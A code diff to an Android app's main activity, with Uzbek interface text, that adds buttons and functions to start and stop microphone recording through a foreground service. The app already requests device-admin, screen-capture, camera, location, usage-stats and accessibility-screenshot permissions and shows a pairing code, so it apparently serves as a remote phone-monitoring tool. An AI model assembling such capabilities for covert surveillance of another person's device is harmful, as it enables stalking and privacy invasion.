@@ -26,7 +26,50 @@ class MainActivity : AppCompatActivity() {
                 getPreferences(0).edit().putString("deviceId", it).apply()
             }
     }
+    private fun startAudioRecording() {
+    if (
+        ContextCompat.checkSelfPermission(
+            this,
+            Manifest.permission.RECORD_AUDIO
+        ) != PackageManager.PERMISSION_GRANTED
+    ) {
+        micLauncher.launch(Manifest.permission.RECORD_AUDIO)
+        return
+    }
 
+    try {
+        ContextCompat.startForegroundService(
+            this,
+            Intent(
+                this,
+                AudioRecordingService::class.java
+            ).setAction(
+                AudioRecordingService.ACTION_START
+            )
+        )
+
+        setStatus("🔴 Audio yozish boshlandi")
+    } catch (_: Exception) {
+        setStatus("❌ Audio yozishni boshlashda xatolik")
+    }
+}
+
+private fun stopAudioRecording() {
+    try {
+        startService(
+            Intent(
+                this,
+                AudioRecordingService::class.java
+            ).setAction(
+                AudioRecordingService.ACTION_STOP
+            )
+        )
+
+        setStatus("⏹️ Audio yozish to‘xtatildi")
+    } catch (_: Exception) {
+        setStatus("❌ Audio yozishni to‘xtatishda xatolik")
+    }
+}
     private lateinit var tvPairing: TextView
     private lateinit var tvStatus: TextView
     private lateinit var dpm: DevicePolicyManager
@@ -95,13 +138,24 @@ class MainActivity : AppCompatActivity() {
 
         root.addView(tvPairing)
         root.addView(tvStatus)
-
+    
         root.addView(makeBtn("📱 Screen capture ruxsati") { requestScreen() })
         root.addView(makeBtn("📷 Kamera ruxsati") { requestCamera() })
         root.addView(makeBtn("📍 Lokatsiya ruxsati") { requestLocation() })
         root.addView(makeBtn("🔔 Bildirishnoma ruxsati") { requestNotification() })
         root.addView(makeBtn("📊 Ilovalar statistikasi ruxsati") { requestUsageStats() })
         root.addView(makeBtn("♿ Accessibility ruxsati (Screenshot)") { requestAccessibility() })
+        root.addView(
+    makeBtn("🎙️ Audio yozishni boshlash") {
+        startAudioRecording()
+    }
+)
+
+root.addView(
+    makeBtn("⏹️ Audio yozishni to‘xtatish") {
+        stopAudioRecording()
+    }
+)
         root.addView(makeBtn("⚡ Batareya cheklovini olib tashlash") { requestBatteryOptimization() })
         root.addView(makeBtn("⏰ Aniq alarm ruxsati") { requestExactAlarm() })
         root.addView(makeBtn(
